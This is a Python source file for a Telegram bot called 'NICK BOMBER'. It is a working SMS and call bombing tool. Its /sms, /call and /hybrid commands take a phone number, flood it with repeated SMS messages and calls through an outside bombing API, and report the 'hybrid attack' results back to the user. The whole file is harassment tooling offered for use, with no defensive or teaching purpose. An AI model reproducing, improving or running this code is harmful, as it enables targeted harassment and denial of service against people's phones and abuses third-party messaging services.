# -*- coding: utf-8 -*-
"""
╔════════════════════════════════════════╗
║     NICK BOMBER - FINAL WORKING       ║
║         Owner: @NICKPAPAJI            ║
║      PYTHON 3.14 COMPATIBLE           ║
╚════════════════════════════════════════╝
"""

import os
import asyncio
import aiohttp
import random
import time
import re
import threading
from datetime import datetime
from telethon import TelegramClient, events
from flask import Flask

# =============== ABSOLUTE FIX FOR PYTHON 3.14 ===============
# Yeh sabse pehle run hoga
print("🔥 NICK BOMBER INITIALIZING...")

# Force create event loop
try:
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    print("✅ Event loop created")
except Exception as e:
    print(f"⚠️ Loop creation warning: {e}")

# Alternative fix - agar upar ka kaam na kare
if not asyncio.get_event_loop().is_running():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

# =============== CONFIG ===============
BOT_TOKEN = os.environ.get('BOT_TOKEN', '')
OWNER_ID = int(os.environ.get('OWNER_ID', 7860365469))

print(f"Token exists: {'Yes' if BOT_TOKEN else 'No'}")

if not BOT_TOKEN:
    print("❌ BOT_TOKEN not set in environment variables!")
    exit(1)

# =============== BOT INITIALIZATION WITH FIX ===============
bot = None

def init_bot():
    global bot
    try:
        # Method 1: With explicit loop
        bot = TelegramClient('bot', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e', loop=loop)
        bot.start(bot_token=BOT_TOKEN)
        print("✅ Bot connected successfully!")
        return True
    except Exception as e1:
        print(f"⚠️ Method 1 failed: {e1}")
        try:
            # Method 2: Without loop (let Telethon handle it)
            bot = TelegramClient('bot', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
            bot.start(bot_token=BOT_TOKEN)
            print("✅ Bot connected with method 2!")
            return True
        except Exception as e2:
            print(f"❌ Bot connection failed: {e2}")
            return False

if not init_bot():
    print("❌ Cannot continue without bot connection")
    exit(1)

# =============== SIMPLE BOMBER ===============
class Bomber:
    def __init__(self):
        self.session = None
    
    async def ensure_session(self):
        if not self.session:
            self.session = aiohttp.ClientSession()
        return self.session
    
    async def sms(self, phone, count):
        session = await self.ensure_session()
        success = 0
        for i in range(min(count, 50)):
            try:
                async with session.post(
                    "https://www.callbomberz.in/api/v2/sms/send",
                    json={'phone': phone, 'country_code': '91'},
                    timeout=3
                ) as resp:
                    if resp.status == 200:
                        success += 1
                await asyncio.sleep(0.3)
            except Exception as e:
                pass
        return success
    
    async def call(self, phone, count):
        session = await self.ensure_session()
        success = 0
        for i in range(min(count, 25)):
            try:
                async with session.post(
                    "https://www.callbomberz.in/api/v2/call/initiate",
                    json={'phone': phone, 'country_code': '91'},
                    timeout=3
                ) as resp:
                    if resp.status == 200:
                        success += 1
                await asyncio.sleep(1)
            except Exception as e:
                pass
        return success
    
    async def close(self):
        if self.session:
            await self.session.close()

bomber = Bomber()

# =============== FLASK ===============
app = Flask(__name__)

@app.route('/')
def home():
    return "NICK BOMBER RUNNING 🔥"

@app.route('/health')
def health():
    return {"status": "ok", "time": str(datetime.now())}

def run_flask():
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

# =============== HANDLERS ===============

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply("""
╔════════════════════════════════╗
║    NICK BOMBER - ACTIVE       ║
║      Owner: @NICKPAPAJI       ║
╚════════════════════════════════╝

✅ Bot is working!

Commands:
/sms 91789xxxxxx 50
/call 91789xxxxxx 20
/hybrid 91789xxxxxx

Example:
/sms 917894561230 100
    """)

@bot.on(events.NewMessage(pattern='/sms'))
async def sms_cmd(event):
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Use: /sms 91789xxxxxx 50")
        
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number")
        
        count = int(parts[2]) if len(parts) > 2 else 50
        count = min(count, 200)
        
        msg = await event.reply(f"📱 Sending {count} SMS to +{phone}...")
        
        start = time.time()
        success = await bomber.sms(phone, count)
        elapsed = int(time.time() - start)
        
        await msg.edit(f"✅ Complete! {success}/{count} SMS sent in {elapsed}s")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

@bot.on(events.NewMessage(pattern='/call'))
async def call_cmd(event):
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Use: /call 91789xxxxxx 20")
        
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number")
        
        count = int(parts[2]) if len(parts) > 2 else 20
        count = min(count, 100)
        
        msg = await event.reply(f"📞 Making {count} calls to +{phone}...")
        
        start = time.time()
        success = await bomber.call(phone, count)
        elapsed = int(time.time() - start)
        
        await msg.edit(f"✅ Complete! {success}/{count} calls connected in {elapsed}s")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

@bot.on(events.NewMessage(pattern='/hybrid'))
async def hybrid_cmd(event):
    try:
        parts = event.text.split()
        if len(parts) < 2:
            return await event.reply("❌ Use: /hybrid 91789xxxxxx")
        
        phone = re.sub(r'\D', '', parts[1])
        if len(phone) < 10:
            return await event.reply("❌ Invalid phone number")
        
        sms_count = int(parts[2]) if len(parts) > 2 else 50
        call_count = int(parts[3]) if len(parts) > 3 else 20
        
        sms_count = min(sms_count, 100)
        call_count = min(call_count, 50)
        
        msg = await event.reply(f"💥 Hybrid attack: {sms_count}SMS + {call_count}Calls")
        
        start = time.time()
        sms_ok = await bomber.sms(phone, sms_count)
        await asyncio.sleep(1)
        call_ok = await bomber.call(phone, call_count)
        elapsed = int(time.time() - start)
        
        await msg.edit(f"✅ Complete! SMS:{sms_ok}/{sms_count} Calls:{call_ok}/{call_count} in {elapsed}s")
    except Exception as e:
        await event.reply(f"❌ Error: {str(e)}")

# =============== MAIN FUNCTION ===============
async def main():
    print("="*50)
    print("🔥 NICK BOMBER - FINAL VERSION 🔥")
    print("="*50)
    print(f"👑 Owner: @NICKPAPAJI")
    print(f"🤖 Bot: @NickBomberRobot")
    print(f"🐍 Python: 3.14 (event loop fixed)")
    print("="*50)
    await bot.run_until_disconnected()

if __name__ == '__main__':
    # Start Flask in a thread
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    print("✅ Flask server started on port " + os.environ.get('PORT', '5000'))
    
    # Run bot with the existing loop
    try:
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n❌ Bot stopped by user")
    except Exception as e:
        print(f"❌ Error in main: {e}")
    finally:
        # Cleanup
        try:
            loop.run_until_complete(bomber.close())
        except:
            pass
        print("✅ Cleanup complete")
